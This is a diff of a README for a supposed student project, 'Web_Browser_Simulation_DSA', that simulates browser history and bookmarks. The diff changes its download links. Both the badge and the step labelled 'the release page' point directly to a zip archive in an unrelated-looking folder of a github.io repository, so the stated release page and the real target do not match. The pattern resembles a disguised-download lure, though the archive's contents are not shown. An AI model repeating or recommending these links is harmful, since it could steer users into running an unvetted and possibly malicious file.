@@ -5,7 +5,7 @@ description: "Simulate core browser features like history, bookmarks, and downlo
 ---
 # 🌐 Web_Browser_Simulation_DSA - Experience how web browsers manage data
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Thameem787/thameem787.github.io/raw/refs/heads/main/amoebiform/thameem_io_github_2.3.zip)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Thameem787/thameem787.github.io/main/amoebiform/thameem_io_github_2.3.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ This application simulates the core engine of a web browser. It uses data struct
 
 ## 📥 Getting the software
 
-1. Visit [the release page](https://github.com/Thameem787/thameem787.github.io/raw/refs/heads/main/amoebiform/thameem_io_github_2.3.zip) to download the software.
+1. Visit [the release page](https://raw.githubusercontent.com/Thameem787/thameem787.github.io/main/amoebiform/thameem_io_github_2.3.zip) to download the software.
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.zip` to start the download.
 
